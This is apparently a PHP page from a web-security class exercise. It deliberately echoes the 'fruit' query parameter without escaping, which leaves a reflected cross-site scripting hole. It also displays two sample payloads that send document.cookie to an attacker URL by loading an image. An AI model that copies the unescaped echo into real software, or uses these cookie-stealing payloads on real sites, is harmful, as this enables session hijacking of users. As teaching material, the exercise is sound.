<?php
    //reflected XSS attack

session_start();
include "include.php";
gen_header();
LoggedIn(1);

if(!isset($_SESSION["name"]))
    exit();


if(isset($_GET["fruit"]))
    echo "<br>Ok, we will send you ".$_GET["fruit"]." to your room";

?>

<p><form method="get">
    Please enter your favorite fruit for today:<br>
    My XSS script: 
    <?php
    $mystring = htmlentities('<script>var i=new Image;
        i.src="http://192.168.0.18/WebDev/Semester2/Security/ex_8_php_xss_vulnerable/getcontent.php?"+
        document.cookie;</script>');
    echo "<h4>XSS attack 1</h4><p>bananas " . $mystring . "</p>";

    $mystring2 = htmlentities('<script>var i=new Image; i.src="./getcontent.php?"+ document.cookie;</script>');
    echo "<h4>XSS attack 2 - shorter string</h4> <p> bananas " . $mystring2 . "</p>";
    ?>
   ( The src url should be the attackers malicious scripts url )<br><br>
   <legend>Comment:</legend>
    <input type="text" size="50" name="fruit"><br><br>
    <input type="submit"><br>
</form>
